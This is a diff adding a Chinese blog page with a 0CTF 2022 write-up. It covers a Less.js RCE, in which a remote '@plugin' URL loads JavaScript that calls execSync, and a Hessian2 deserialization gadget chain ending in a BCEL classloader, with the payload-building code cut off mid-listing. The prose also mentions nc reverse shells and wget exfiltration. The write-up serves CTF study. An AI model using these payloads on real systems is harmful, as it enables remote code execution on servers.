@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0CTF2022复现嗯，究极挨打，只做了一个被全场秒烂了的go，由于剩下的都是java，然后就摆了。然后看着天哥他们ak 0ctf的web，自闭了捏 ohf被秒烂的go题，抓包看路由可以看到终端那边给了个go的序列化数据，less路由一开始没看懂，一开始以为是linux那个less读文件的，按了半天没反应，然后隔壁的好哥哥和我说这个是写css的东西，可以把他的格式转换成css。然后可以从p神的文章">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0CTF2022复现">
+<meta property="og:url" content="https://blog.z3ratu1.cn/0CTF2022%E5%A4%8D%E7%8E%B0.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="0CTF2022复现嗯，究极挨打，只做了一个被全场秒烂了的go，由于剩下的都是java，然后就摆了。然后看着天哥他们ak 0ctf的web，自闭了捏 ohf被秒烂的go题，抓包看路由可以看到终端那边给了个go的序列化数据，less路由一开始没看懂，一开始以为是linux那个less读文件的，按了半天没反应，然后隔壁的好哥哥和我说这个是写css的东西，可以把他的格式转换成css。然后可以从p神的文章">
+<meta property="og:locale">
+<meta property="article:published_time" content="2022-09-22T12:22:03.000Z">
+<meta property="article:modified_time" content="2022-09-27T13:16:13.740Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/0CTF2022%E5%A4%8D%E7%8E%B0.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>0CTF2022复现 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/0CTF2022%E5%A4%8D%E7%8E%B0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          0CTF2022复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-22 20:22:03" itemprop="dateCreated datePublished" datetime="2022-09-22T20:22:03+08:00">2022-09-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-27 21:16:13" itemprop="dateModified" datetime="2022-09-27T21:16:13+08:00">2022-09-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/0CTF2022%E5%A4%8D%E7%8E%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="0CTF2022复现" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/0CTF2022%E5%A4%8D%E7%8E%B0.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/0CTF2022%E5%A4%8D%E7%8E%B0.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0CTF2022复现"><a href="#0CTF2022复现" class="headerlink" title="0CTF2022复现"></a>0CTF2022复现</h1><p>嗯，究极挨打，只做了一个被全场秒烂了的go，由于剩下的都是java，然后就摆了。然后看着天哥他们ak 0ctf的web，自闭了捏</p>
+<h2 id="ohf"><a href="#ohf" class="headerlink" title="ohf"></a>ohf</h2><p>被秒烂的go题，抓包看路由可以看到终端那边给了个go的序列化数据，less路由一开始没看懂，一开始以为是linux那个less读文件的，按了半天没反应，然后隔壁的好哥哥和我说这个是写css的东西，可以把他的格式转换成css。然后可以从p神的文章中获知这个less有一个任意文件读取<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leavesongs.com/PENETRATION/flarum-rce-tour.html">从偶遇Flarum开始的RCE之旅</a></p>
+<p>读到源码之后可以看到一个go的反序列化，然后序列化数据的version字段会进一个第三方库的eval，这个库感觉也不是沙箱，就是个直接的eval，但是阉割了模块<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/traefik/yaegi">traefik&#x2F;yaegi</a></p>
+<p>小跟一下可以看到给了哪些模块，用来执行命令的<code>os/exec</code>没了，但是还有<code>os</code>，本来在想能不能像python一样从哪摸个import之类的语句把<code>os/exec</code>搞出来，但是无果。对go的认知-&gt;0，然后就在想<code>os/exec</code>是不是对某些底层实现的封装，底层实现会不会不在这个库里面，然后小跟一下就能找到这个<code>os.StartProcess</code>，但是这个玩意实在是有点坐牢，要手动传入文件给stdin&#x2F;out，这样子我很难搞回显。<br>尝试直接open文件然后把文件替换到stdout，然后读文件外带，无果。莫非是进程没有结束fd没关掉，当初应该试试手动flush的。。。。<br>最后直接stdout写文件然后再重新进行一个请求读出来就行了（less读也行）<br>期间尝试了pipe进行读写但仍然无果，最后go大师和我说他写了一版pipe行了，就是pipe的stdin作为StartProcess的stdout，然后读stdout获取结果。（和前段时间学习的pipe使用似乎一致）<br>题目环境估计是alpine，所以没得bash直接弹，但alpine似乎自带busybox，也可以一键nc弹。。。或者sh -c wget外带。。。总之我在这个玩意的回显上浪费了两个多小时</p>
+<h3 id="究极非预期"><a href="#究极非预期" class="headerlink" title="究极非预期"></a>究极非预期</h3><p>less可以直接执行命令。。。。<br>这个文章还是21年的，复制粘贴一键打通，怪不得被大家打烂了。。。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token function">registerPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    
+     install<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>less<span class="token punctuation">,</span> pluginManager<span class="token punctuation">,</span> functions<span class="token punctuation">)</span> <span class="token punctuation">{</span>        
+             functions<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>            
+                   <span class="token keyword">return</span> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span>val<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        
+              <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
+        <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<pre class=" language-css"><code class="language-css"><span class="token atrule"><span class="token rule">@plugin</span> <span class="token string">"http://xxxx/plugin.js"</span><span class="token punctuation">;</span></span>
+
+<span class="token selector">body </span><span class="token punctuation">{</span>
+<span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://zhuanlan.zhihu.com/p/389345632">利用Less.js实现远程代码执行(RCE)</a></p>
+<h2 id="hessian-onlyjdk"><a href="#hessian-onlyjdk" class="headerlink" title="hessian onlyjdk"></a>hessian onlyjdk</h2><p>就给了个hessian，直接readObject，没了，docker给出了jdk是openjdk8u342<br>然后还启动java agent把<code>com.sun.org.apache.xml.internal.security.utils.JavaUtils</code>给hook掉了</p>
+<p>hint中给出了一个XStream的链和一个Hessain2的expect调用toString的入口</p>
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>进行前置知识的补全<br>先看参考文章学习<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://y4er.com/posts/wangdingbei-badbean-hessian2/">网鼎杯2022 BadBean Hessian2反序列化</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://paper.seebug.org/1814/">Apache Dubbo Hessian2 异常处理时反序列化（CVE-2021-43297）</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.0kami.cn/blog/2020/talk-about-xstream-deserialization-20200418">回顾XStream反序列化漏洞</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/escape-w/p/16107046.html">Xstream反序列化漏洞研究笔记</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.anquanke.com/post/id/234537">如何高效的挖掘Java反序列化利用链？</a></p>
+<h4 id="Hessain反序列化"><a href="#Hessain反序列化" class="headerlink" title="Hessain反序列化"></a>Hessain反序列化</h4><p>入口点是反序列化时对map操作调用的hashCode和equals方法，然后后续又出现了一个恶意序列化流触发expect的toString入口<br>Hessain2可以对未实现serializable的类实现序列化与反序列化，只需要对其outputStream调用一个<code>output.getSerializerFactory().setAllowNonSerializable(true);</code>即可。不会受到像fastjson那样无法赋值没有setter的private变量的影响，但无法序列化与反序列化transient对象。</p>
+<p>有一个严重的缺点，不能反序列化没有public构造方法的类，类实例的创建是这么写的</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span>
+    map <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>_ctor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOExceptionWrapper</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>直接对constructor newInstance，但是没有setAccessable，如果构造函数是private的就会挂掉</p>
+<p>这里看一下toString是怎么触发的，触发的点是expect，这个函数的意义就是读序列化流的时候，比如认为接下来的数据是个String，结果读出来了个Object之类的，就会触发然后报错expect String，实际读了个Object，然后把读出来的Object toString输出出来，非常合理。所以要触发expect，就得搓出来有问题的序列化流，不过这并不是很困难。</p>
+<p>简单看一下readObject实现和分析文章就能发现，每个值前面会有一个数表示type，对type switch一下进对应处理<br>可以看到<code>case 67</code>的时候进<code>readObjectDefinition</code>进<code>readString</code>，case从32到127都会进expect，这也是网上搜到的经典操作。<br>实际上触发点一大堆，比如case 77的时候readtype，进readInt或者readString，也能进expect，case 81，case 79什么的都行，只要你能让readXXX的时候读出来的type和预期的type不一样就进expect，在写入的时候稍微构造一下就可以了</p>
+<p>然后在写入方面，这边全都是魔改writeUTF并且用的是Apache dubbo下的Hessain来写一位魔改数据，搞得我一开始都没看懂。。。。反正payload是用baos搓出来的，直接baos写就行了</p>
+<pre class=" language-java"><code class="language-java">ByteArrayOutputStream baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Hessian2Output output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Output</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
+baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+output<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>evilClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
+output<span class="token punctuation">.</span><span class="token function">flushBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ByteArrayInputStream bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Hessian2Input input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Input</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>
+input<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>即可触发evilClass的toString方法</p>
+<h4 id="XStream反序列化"><a href="#XStream反序列化" class="headerlink" title="XStream反序列化"></a>XStream反序列化</h4><p>主要是看hint顺便看了一下，结果看了半天感觉没什么帮助，就当入门了。。。<br>XStream有一系列的Converter对XML中的不同类型属性进行还原，Converter有一个优先级顺位，跟一下可以在DefaultConverterLookup这里找到所有的Converter列表，被放在一个优先级队列里面，其中SerializableConverter是倒数第二个，<code>ReflectionConverter</code>是最后一个，优先级最低的两个。似乎需要不满足前面的许多条件才轮得到（但是简单翻了一下感觉一大堆<code>SingleValueConvertWrapper</code>，也就是稍微复杂一点的类似乎就是走Serialize或者Reflection？搞不懂捏）</p>
+<p>XStream反序列化，有两个触发点，一个是<code>TreeMapConverter</code>调用的<code>compareTo</code>和<code>MapConvert</code>调用的<code>hashCode</code><br>以及一个<code>SerializableConverter</code>调用的readObject原生反序列化，实现了Serializable接口的类会被<code>SerializableConverter</code>调用其readObject进行反序列化，但XStream调用的readObject的反序列化又和真正的原生反序列化有所不同，其实现了一个<code>CustomObjectInputStream</code>，调用其readObject，但是实际的逻辑仍然回到XStream中处理，输入的类由XStream从xml里面还原。在这种情况下，只需要一个入口点是可序列化的类，就能调用readObject，不可序列化的类走最后的<code>ReflectionConverter</code>反射赋值</p>
+<p>不过试了一下反射赋值的时候transient属性还是被处理了，反序列化的时候被忽略了，但是如果那个类本身实现了Serializable就可能通过<code>SerializableConverter</code>的readObject恢复出来</p>
+<h4 id="Hint的XStream链"><a href="#Hint的XStream链" class="headerlink" title="Hint的XStream链"></a>Hint的XStream链</h4><pre><code>javax.swing.MultiUIDefaults.toString
+            UIDefaults.get
+                UIDefaults.getFromHashTable
+                    UIDefaults$LazyValue.createValue
+                    SwingLazyValue.createValue
+                        javax.naming.InitialContext.doLookup()
+</code></pre>
+<p>这个链是从MultiUIDefaults的toString方法开始，一路调用到SwingLazyValue的createValue，是一个纯jdk利用链（但是这个SwingLazyValue好像在jdk8之后删了）<br>createValue方法如下</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">createValue</span><span class="token punctuation">(</span>UIDefaults var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            ReflectUtil<span class="token punctuation">.</span><span class="token function">checkPackageAccess</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Class <span class="token class-name">var2</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>className<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>ClassLoader<span class="token punctuation">)</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Class<span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>methodName <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                var3 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClassArray</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Method var6 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>methodName<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">makeAccessible</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> var6<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                var3 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClassArray</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Constructor var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">makeAccessible</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> var4<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>对着一个class对象invoke，或者对着constructor对象newInstance，由于用的是getMethod&#x2F;Constructor，只能调用public的方法，又var2是一个Class而不是类实例，只能调用静态方法</p>
+<p>所以这里找到的最终sink为javax.naming.InitialContext的doLookup方法，能够实现jndi注入，当然，这个链不能现成使用，有两个地方需要替换</p>
+<p>第一个是开头的入口<code>MultiUIDefaults</code>，这个类没有public的构造方法，Hessain还原不出来<br>另一个是最后的jndi注入，在纯jdk情况+8u342的超高版本下，jndi注入无法利用，需要把这两个都替换掉才能完成利用</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>那么，怎么挖jdk的toString到get的触发点呢？tabby当然是我们最好的伙伴，但是，出于未知原因，tabby在我的机器上的运行速度令人担忧，jdk大约有3w个类，而tabby在我的机器上的处理速度大约为一分钟200个类？3w个类跑一天。。。以前不是这样的捏。。。不知道什么情况，所以直接快进到看wp</p>
+<h4 id="解1"><a href="#解1" class="headerlink" title="解1"></a>解1</h4><p>然后快进到ysomap里面居然有一个现成的链<code>LazyValueForHessian</code>，这里的原始调用链如下</p>
+<pre><code>javax.naming.ldap.Rdn$RdnEntry.compareTo
+    com.sun.org.apache.xpath.internal.objects.XStringForFSB.equals
+        javax.activation.MimeTypeParameterList.toString
+            UIDefaults.get
+            ......
+</code></pre>
+<p>这个还是toString没出的时候提出的从compareTo触发的链，现在直接从toString处上也可以<br>MimeTypeParameterList对自己的parameters调用了一个get，parameters是一个hashtable，而UIDefault刚好是extend了hashtable的，这样子就把前面半截续上来了</p>
+<p>还看到一个师傅使用的是<code>sun.security.pkcs.PKCS9Attributes</code>这个类，这个类的toString调用getAttribute，里面对自己的attribute属性，也是个hashtable，调用了get</p>
+<p>现在，就只剩一个静态执行方法执行命令的类了，这里有师傅找到了一个bcel的classloader <code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code>，存在一个static方法<code>_main</code>，进runMain使用自身的loader进行了loadClass，看到这个类名就知道这个loader应该是一个bcel classloader，可以直接从ClassName里面还原出类为所欲为，并且这个loader是调用构造函数赋值的，也无需担忧手动赋值。这样子就可以手搓出payload了。因为以前用的都是ysoserial，ysomap没怎么用过，所以不太看得懂。。。还是从头手搓8</p>
+<p>搓出来如下payload</p>
+<pre class=" language-java"><code class="language-java">        ByteArrayOutputStream baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Hessian2Output output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Output</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        JavaClass evil <span class="token operator">=</span> Repository<span class="token punctuation">.</span><span class="token function">lookupClass</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>test<span class="token punctuation">.</span>EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String payload <span class="token operator">=</span> <span class="token string">"$$BCEL$$"</span><span class="token operator">+</span>Utility<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>evil<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        UIDefaults uiDefaults <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UIDefaults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
